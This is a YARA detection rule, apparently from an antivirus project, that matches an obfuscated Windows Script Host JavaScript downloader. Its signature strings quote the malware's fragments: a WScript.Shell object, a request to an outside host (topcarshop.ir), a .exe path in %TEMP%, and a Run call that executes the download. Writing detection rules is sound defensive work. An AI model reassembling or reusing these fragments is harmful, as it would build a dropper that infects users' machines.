rule sig_20160330_516d238827877271bc5f6cb0ace908fd {
  meta:
    description = "datamaliciousorder - file 20160330_516d238827877271bc5f6cb0ace908fd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7cac2a59aab2b094cb06d1dd66ef7f32df9acec8d7e63b7b3919454987fb9d10"

  strings:
    $s1  = "function _L(_FN, _J){_Y = _Y * 1; return _FN - _J;};" fullword ascii
    $s2  = "var _BY = function _K() {return WScript[_QD](\"WScript\"+\".Shell\");}(), _R = 11;" fullword ascii
    $s3  = "if (_K0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function _PB() {return _BY[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"xib8uc2CNJGzSoBI.ex\" + \"e\";};" fullword ascii
    $s5  = "_K0[_F](\"GET\", \"http://topcarshop.ir/m1kas\", false);" fullword ascii
    $s6  = "function _PZ(){return _VB + \"\";};" fullword ascii
    $s7  = "function _W() {return ((_FX == true) && (_FX == _E)) ? 1 : _Y;};" fullword ascii
    $s8  = "function _XL(_II){_BY[\"Run\"](_II, _Y, _Y);};" fullword ascii
    $s9  = " while (_P){" fullword ascii
    $s10 = "function _CX()" fullword ascii
    $s11 = "function _O(_N) {var _IU = (1, 2, 3, 4, 5, _N); return _IU;};" fullword ascii
    $s12 = "var _SZ = new this[\"Date\"]();" fullword ascii
    $s13 = "function _BV(){return 22;};" fullword ascii
    $s14 = "return _L(_AE, _P0);" fullword ascii
    $s15 = "function _TC(){return _QD;};" fullword ascii
    $s16 = "var _RA = false;" fullword ascii
    $s17 = "var _E = false;" fullword ascii
    $s18 = "_E = true; " fullword ascii
    $s19 = "_FX = true; " fullword ascii
    $s20 = "var _FX = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}